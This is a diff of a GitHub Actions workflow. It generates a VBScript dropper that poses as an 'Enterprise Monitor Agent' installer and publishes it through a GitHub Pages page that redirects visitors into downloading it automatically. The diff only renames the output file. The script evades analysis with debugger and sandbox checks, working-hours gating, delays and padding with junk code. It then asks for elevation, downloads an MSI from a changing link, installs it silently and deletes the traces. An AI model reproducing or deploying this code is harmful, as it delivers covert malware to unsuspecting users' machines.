@@ -26,218 +26,218 @@ jobs:
         echo "Creating bulky VBS with link: $current_link"
         
         # Create a bulky VBS with lots of junk code using echo commands
-        echo "' --------------------------------------------------------------------------" > file.vbs
-        echo "'  Silent Installer - Enterprise Monitor Agent" >> file.vbs
-        echo "' --------------------------------------------------------------------------" >> file.vbs
-        echo "Option Explicit" >> file.vbs
-        echo "" >> file.vbs
-        echo "' System initialization variables" >> file.vbs
-        echo "Dim WshShell, Fso, NetObj, EnvVars, SysInfo" >> file.vbs
-        echo "Set WshShell = CreateObject(\"WScript.Shell\")" >> file.vbs
-        echo "Set Fso = CreateObject(\"Scripting.FileSystemObject\")" >> file.vbs
-        echo "Set NetObj = CreateObject(\"WScript.Network\")" >> file.vbs
-        echo "Set EnvVars = WshShell.Environment(\"Process\")" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Anti-analysis dummy variables" >> file.vbs
-        echo "Dim dummy1, dummy2, dummy3, dummy4, dummy5" >> file.vbs
-        echo "dummy1 = \"System initialization\"" >> file.vbs
-        echo "dummy2 = \"Network configuration\"" >> file.vbs
-        echo "dummy3 = \"Security validation\"" >> file.vbs
-        echo "dummy4 = \"Performance monitoring\"" >> file.vbs
-        echo "dummy5 = \"Error reporting\"" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Fake system information collection" >> file.vbs
-        echo "Function GetSystemInfo()" >> file.vbs
-        echo "    Dim result" >> file.vbs
-        echo "    result = NetObj.ComputerName & \"|\" & NetObj.UserName" >> file.vbs
-        echo "    GetSystemInfo = result" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Process validation function" >> file.vbs
-        echo "Function ValidateProcess(processName)" >> file.vbs
-        echo "    Dim colProcesses, objProcess" >> file.vbs
-        echo "    On Error Resume Next" >> file.vbs
-        echo "    Set colProcesses = GetObject(\"winmgmts:\").ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> file.vbs
-        echo "    " >> file.vbs
-        echo "    ValidateProcess = False" >> file.vbs
-        echo "    For Each objProcess in colProcesses" >> file.vbs
-        echo "        ValidateProcess = True" >> file.vbs
-        echo "        Exit For" >> file.vbs
-        echo "    Next" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Network adapter information" >> file.vbs
-        echo "Function GetNetworkInfo()" >> file.vbs
-        echo "    Dim result" >> file.vbs
-        echo "    result = \"Network adapter: \" & NetObj.ComputerName" >> file.vbs
-        echo "    GetNetworkInfo = result" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Registry operations helper" >> file.vbs
-        echo "Function ReadRegKey(keyPath, valueName)" >> file.vbs
-        echo "    On Error Resume Next" >> file.vbs
-        echo "    ReadRegKey = WshShell.RegRead(keyPath & \"\\\" & valueName)" >> file.vbs
-        echo "    If Err.Number <> 0 Then ReadRegKey = \"\"" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Write registry value" >> file.vbs
-        echo "Sub WriteRegKey(keyPath, valueName, value)" >> file.vbs
-        echo "    On Error Resume Next" >> file.vbs
-        echo "    WshShell.RegWrite keyPath & \"\\\" & valueName, value, \"REG_SZ\"" >> file.vbs
-        echo "End Sub" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Encryption helper function" >> file.vbs
-        echo "Function SimpleEncrypt(text)" >> file.vbs
-        echo "    Dim i, result" >> file.vbs
-        echo "    result = \"\"" >> file.vbs
-        echo "    For i = 1 To Len(text)" >> file.vbs
-        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> file.vbs
-        echo "    Next" >> file.vbs
-        echo "    SimpleEncrypt = result" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Decryption helper function" >> file.vbs
-        echo "Function SimpleDecrypt(text)" >> file.vbs
-        echo "    Dim i, result" >> file.vbs
-        echo "    result = \"\"" >> file.vbs
-        echo "    For i = 1 To Len(text)" >> file.vbs
-        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> file.vbs
-        echo "    Next" >> file.vbs
-        echo "    SimpleDecrypt = result" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Check for debugger processes" >> file.vbs
-        echo "Function IsDebuggerPresent()" >> file.vbs
-        echo "    Dim debuggers, proc" >> file.vbs
-        echo "    debuggers = Array(\"ollydbg.exe\", \"windbg.exe\", \"x64dbg.exe\", \"ida.exe\", \"ida64.exe\", \"idaq.exe\", \"idaq64.exe\", \"cheatengine.exe\", \"procmon.exe\", \"procexp.exe\")" >> file.vbs
-        echo "    " >> file.vbs
-        echo "    IsDebuggerPresent = False" >> file.vbs
-        echo "    For Each proc In debuggers" >> file.vbs
-        echo "        If ValidateProcess(proc) Then" >> file.vbs
-        echo "            IsDebuggerPresent = True" >> file.vbs
-        echo "            Exit For" >> file.vbs
-        echo "        End If" >> file.vbs
-        echo "    Next" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Anti-sandbox time delay" >> file.vbs
-        echo "Sub AntiSandboxDelay()" >> file.vbs
-        echo "    Dim startTime, endTime" >> file.vbs
-        echo "    startTime = Timer" >> file.vbs
-        echo "    endTime = startTime + 30 ' 30 second delay" >> file.vbs
-        echo "    " >> file.vbs
-        echo "    Do While Timer < endTime" >> file.vbs
-        echo "        ' Do nothing - just waste time" >> file.vbs
-        echo "        Dim dummy" >> file.vbs
-        echo "        dummy = dummy & \"x\"" >> file.vbs
-        echo "    Loop" >> file.vbs
-        echo "End Sub" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Check for mouse activity (sandbox detection)" >> file.vbs
-        echo "Function HasMouseActivity()" >> file.vbs
-        echo "    On Error Resume Next" >> file.vbs
-        echo "    Dim objShell" >> file.vbs
-        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> file.vbs
-        echo "    " >> file.vbs
-        echo "    ' Get mouse position twice with a small delay" >> file.vbs
-        echo "    Dim pos1, pos2" >> file.vbs
-        echo "    pos1 = objShell.AppActivate(\"WScript\")" >> file.vbs
-        echo "    WScript.Sleep 1000" >> file.vbs
-        echo "    pos2 = objShell.AppActivate(\"WScript\")" >> file.vbs
-        echo "    " >> file.vbs
-        echo "    ' If positions are the same, likely a sandbox" >> file.vbs
-        echo "    HasMouseActivity = (pos1 <> pos2)" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' More junk functions to add bulk" >> file.vbs
-        echo "Function FakeFunction1()" >> file.vbs
-        echo "    FakeFunction1 = \"Fake result 1\"" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "Function FakeFunction2()" >> file.vbs
-        echo "    FakeFunction2 = \"Fake result 2\"" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "Function FakeFunction3()" >> file.vbs
-        echo "    FakeFunction3 = \"Fake result 3\"" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "Function FakeFunction4()" >> file.vbs
-        echo "    FakeFunction4 = \"Fake result 4\"" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "Function FakeFunction5()" >> file.vbs
-        echo "    FakeFunction5 = \"Fake result 5\"" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Main execution starts here" >> file.vbs
-        echo "' Anti-analysis checks" >> file.vbs
-        echo "If IsDebuggerPresent() Then WScript.Quit" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Time-based anti-sandbox" >> file.vbs
-        echo "If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Check for user activity" >> file.vbs
-        echo "If Not HasMouseActivity() Then WScript.Quit" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Additional delay to frustrate analysis" >> file.vbs
-        echo "AntiSandboxDelay" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Core functionality - download and execute" >> file.vbs
-        echo "' Check for elevation" >> file.vbs
-        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> file.vbs
-        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> file.vbs
-        echo "    WScript.Quit" >> file.vbs
-        echo "End If" >> file.vbs
-        echo "" >> file.vbs
-        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> file.vbs
-        echo "strUrl = \"$current_link\"" >> file.vbs
-        echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> file.vbs
-        echo "strFile = strTemp & \"\\agent_installer.msi\"" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Download with redirect handling" >> file.vbs
-        echo "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> file.vbs
-        echo "objXMLHTTP.open \"GET\", strUrl, False" >> file.vbs
-        echo "objXMLHTTP.send()" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Check for any redirect (301, 302, etc.)" >> file.vbs
-        echo "If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then" >> file.vbs
-        echo "    strUrl = objXMLHTTP.getResponseHeader(\"Location\")" >> file.vbs
-        echo "    objXMLHTTP.open \"GET\", strUrl, False" >> file.vbs
-        echo "    objXMLHTTP.send()" >> file.vbs
-        echo "End If" >> file.vbs
-        echo "" >> file.vbs
-        echo "If objXMLHTTP.Status = 200 Then" >> file.vbs
-        echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> file.vbs
-        echo "    objADOStream.Open" >> file.vbs
-        echo "    objADOStream.Type = 1 ' Binary" >> file.vbs
-        echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> file.vbs
-        echo "    objADOStream.Position = 0" >> file.vbs
-        echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> file.vbs
-        echo "    objADOStream.Close" >> file.vbs
-        echo "" >> file.vbs
-        echo "    ' Install" >> file.vbs
-        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> file.vbs
-        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> file.vbs
-        echo "" >> file.vbs
-        echo "    ' Cleanup" >> file.vbs
-        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> file.vbs
-        echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> file.vbs
-        echo "End If" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Final cleanup" >> file.vbs
-        echo "Set WshShell = Nothing" >> file.vbs
-        echo "Set Fso = Nothing" >> file.vbs
-        echo "Set NetObj = Nothing" >> file.vbs
+        echo "' --------------------------------------------------------------------------" > yam.vbs
+        echo "'  Silent Installer - Enterprise Monitor Agent" >> yam.vbs
+        echo "' --------------------------------------------------------------------------" >> yam.vbs
+        echo "Option Explicit" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' System initialization variables" >> yam.vbs
+        echo "Dim WshShell, Fso, NetObj, EnvVars, SysInfo" >> yam.vbs
+        echo "Set WshShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
+        echo "Set Fso = CreateObject(\"Scripting.FileSystemObject\")" >> yam.vbs
+        echo "Set NetObj = CreateObject(\"WScript.Network\")" >> yam.vbs
+        echo "Set EnvVars = WshShell.Environment(\"Process\")" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Anti-analysis dummy variables" >> yam.vbs
+        echo "Dim dummy1, dummy2, dummy3, dummy4, dummy5" >> yam.vbs
+        echo "dummy1 = \"System initialization\"" >> yam.vbs
+        echo "dummy2 = \"Network configuration\"" >> yam.vbs
+        echo "dummy3 = \"Security validation\"" >> yam.vbs
+        echo "dummy4 = \"Performance monitoring\"" >> yam.vbs
+        echo "dummy5 = \"Error reporting\"" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Fake system information collection" >> yam.vbs
+        echo "Function GetSystemInfo()" >> yam.vbs
+        echo "    Dim result" >> yam.vbs
+        echo "    result = NetObj.ComputerName & \"|\" & NetObj.UserName" >> yam.vbs
+        echo "    GetSystemInfo = result" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Process validation function" >> yam.vbs
+        echo "Function ValidateProcess(processName)" >> yam.vbs
+        echo "    Dim colProcesses, objProcess" >> yam.vbs
+        echo "    On Error Resume Next" >> yam.vbs
+        echo "    Set colProcesses = GetObject(\"winmgmts:\").ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> yam.vbs
+        echo "    " >> yam.vbs
+        echo "    ValidateProcess = False" >> yam.vbs
+        echo "    For Each objProcess in colProcesses" >> yam.vbs
+        echo "        ValidateProcess = True" >> yam.vbs
+        echo "        Exit For" >> yam.vbs
+        echo "    Next" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Network adapter information" >> yam.vbs
+        echo "Function GetNetworkInfo()" >> yam.vbs
+        echo "    Dim result" >> yam.vbs
+        echo "    result = \"Network adapter: \" & NetObj.ComputerName" >> yam.vbs
+        echo "    GetNetworkInfo = result" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Registry operations helper" >> yam.vbs
+        echo "Function ReadRegKey(keyPath, valueName)" >> yam.vbs
+        echo "    On Error Resume Next" >> yam.vbs
+        echo "    ReadRegKey = WshShell.RegRead(keyPath & \"\\\" & valueName)" >> yam.vbs
+        echo "    If Err.Number <> 0 Then ReadRegKey = \"\"" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Write registry value" >> yam.vbs
+        echo "Sub WriteRegKey(keyPath, valueName, value)" >> yam.vbs
+        echo "    On Error Resume Next" >> yam.vbs
+        echo "    WshShell.RegWrite keyPath & \"\\\" & valueName, value, \"REG_SZ\"" >> yam.vbs
+        echo "End Sub" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Encryption helper function" >> yam.vbs
+        echo "Function SimpleEncrypt(text)" >> yam.vbs
+        echo "    Dim i, result" >> yam.vbs
+        echo "    result = \"\"" >> yam.vbs
+        echo "    For i = 1 To Len(text)" >> yam.vbs
+        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> yam.vbs
+        echo "    Next" >> yam.vbs
+        echo "    SimpleEncrypt = result" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Decryption helper function" >> yam.vbs
+        echo "Function SimpleDecrypt(text)" >> yam.vbs
+        echo "    Dim i, result" >> yam.vbs
+        echo "    result = \"\"" >> yam.vbs
+        echo "    For i = 1 To Len(text)" >> yam.vbs
+        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> yam.vbs
+        echo "    Next" >> yam.vbs
+        echo "    SimpleDecrypt = result" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Check for debugger processes" >> yam.vbs
+        echo "Function IsDebuggerPresent()" >> yam.vbs
+        echo "    Dim debuggers, proc" >> yam.vbs
+        echo "    debuggers = Array(\"ollydbg.exe\", \"windbg.exe\", \"x64dbg.exe\", \"ida.exe\", \"ida64.exe\", \"idaq.exe\", \"idaq64.exe\", \"cheatengine.exe\", \"procmon.exe\", \"procexp.exe\")" >> yam.vbs
+        echo "    " >> yam.vbs
+        echo "    IsDebuggerPresent = False" >> yam.vbs
+        echo "    For Each proc In debuggers" >> yam.vbs
+        echo "        If ValidateProcess(proc) Then" >> yam.vbs
+        echo "            IsDebuggerPresent = True" >> yam.vbs
+        echo "            Exit For" >> yam.vbs
+        echo "        End If" >> yam.vbs
+        echo "    Next" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Anti-sandbox time delay" >> yam.vbs
+        echo "Sub AntiSandboxDelay()" >> yam.vbs
+        echo "    Dim startTime, endTime" >> yam.vbs
+        echo "    startTime = Timer" >> yam.vbs
+        echo "    endTime = startTime + 30 ' 30 second delay" >> yam.vbs
+        echo "    " >> yam.vbs
+        echo "    Do While Timer < endTime" >> yam.vbs
+        echo "        ' Do nothing - just waste time" >> yam.vbs
+        echo "        Dim dummy" >> yam.vbs
+        echo "        dummy = dummy & \"x\"" >> yam.vbs
+        echo "    Loop" >> yam.vbs
+        echo "End Sub" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Check for mouse activity (sandbox detection)" >> yam.vbs
+        echo "Function HasMouseActivity()" >> yam.vbs
+        echo "    On Error Resume Next" >> yam.vbs
+        echo "    Dim objShell" >> yam.vbs
+        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
+        echo "    " >> yam.vbs
+        echo "    ' Get mouse position twice with a small delay" >> yam.vbs
+        echo "    Dim pos1, pos2" >> yam.vbs
+        echo "    pos1 = objShell.AppActivate(\"WScript\")" >> yam.vbs
+        echo "    WScript.Sleep 1000" >> yam.vbs
+        echo "    pos2 = objShell.AppActivate(\"WScript\")" >> yam.vbs
+        echo "    " >> yam.vbs
+        echo "    ' If positions are the same, likely a sandbox" >> yam.vbs
+        echo "    HasMouseActivity = (pos1 <> pos2)" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' More junk functions to add bulk" >> yam.vbs
+        echo "Function FakeFunction1()" >> yam.vbs
+        echo "    FakeFunction1 = \"Fake result 1\"" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "Function FakeFunction2()" >> yam.vbs
+        echo "    FakeFunction2 = \"Fake result 2\"" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "Function FakeFunction3()" >> yam.vbs
+        echo "    FakeFunction3 = \"Fake result 3\"" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "Function FakeFunction4()" >> yam.vbs
+        echo "    FakeFunction4 = \"Fake result 4\"" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "Function FakeFunction5()" >> yam.vbs
+        echo "    FakeFunction5 = \"Fake result 5\"" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Main execution starts here" >> yam.vbs
+        echo "' Anti-analysis checks" >> yam.vbs
+        echo "If IsDebuggerPresent() Then WScript.Quit" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Time-based anti-sandbox" >> yam.vbs
+        echo "If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Check for user activity" >> yam.vbs
+        echo "If Not HasMouseActivity() Then WScript.Quit" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Additional delay to frustrate analysis" >> yam.vbs
+        echo "AntiSandboxDelay" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Core functionality - download and execute" >> yam.vbs
+        echo "' Check for elevation" >> yam.vbs
+        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> yam.vbs
+        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> yam.vbs
+        echo "    WScript.Quit" >> yam.vbs
+        echo "End If" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> yam.vbs
+        echo "strUrl = \"$current_link\"" >> yam.vbs
+        echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> yam.vbs
+        echo "strFile = strTemp & \"\\agent_installer.msi\"" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Download with redirect handling" >> yam.vbs
+        echo "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> yam.vbs
+        echo "objXMLHTTP.open \"GET\", strUrl, False" >> yam.vbs
+        echo "objXMLHTTP.send()" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Check for any redirect (301, 302, etc.)" >> yam.vbs
+        echo "If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then" >> yam.vbs
+        echo "    strUrl = objXMLHTTP.getResponseHeader(\"Location\")" >> yam.vbs
+        echo "    objXMLHTTP.open \"GET\", strUrl, False" >> yam.vbs
+        echo "    objXMLHTTP.send()" >> yam.vbs
+        echo "End If" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "If objXMLHTTP.Status = 200 Then" >> yam.vbs
+        echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> yam.vbs
+        echo "    objADOStream.Open" >> yam.vbs
+        echo "    objADOStream.Type = 1 ' Binary" >> yam.vbs
+        echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> yam.vbs
+        echo "    objADOStream.Position = 0" >> yam.vbs
+        echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> yam.vbs
+        echo "    objADOStream.Close" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "    ' Install" >> yam.vbs
+        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
+        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "    ' Cleanup" >> yam.vbs
+        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> yam.vbs
+        echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> yam.vbs
+        echo "End If" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Final cleanup" >> yam.vbs
+        echo "Set WshShell = Nothing" >> yam.vbs
+        echo "Set Fso = Nothing" >> yam.vbs
+        echo "Set NetObj = Nothing" >> yam.vbs
         echo "Set EnvVars = Nothing"
         
         # Create index.html for GitHub Pages
-        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=file.vbs"></head><body><p>If not redirected, <a href="file.vbs">click here</a></p></body></html>' > index.html
+        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=yam.vbs"></head><body><p>If not redirected, <a href="yam.vbs">click here</a></p></body></html>' > index.html
         
         # Commit and push the updated files
         git config --global user.email "action@github.com"
         git config --global user.name "GitHub Action"
-        git add file.vbs index.html
+        git add yam.vbs index.html
         git commit -m "Update bulky VBS with current link" || exit 0
         git push
         
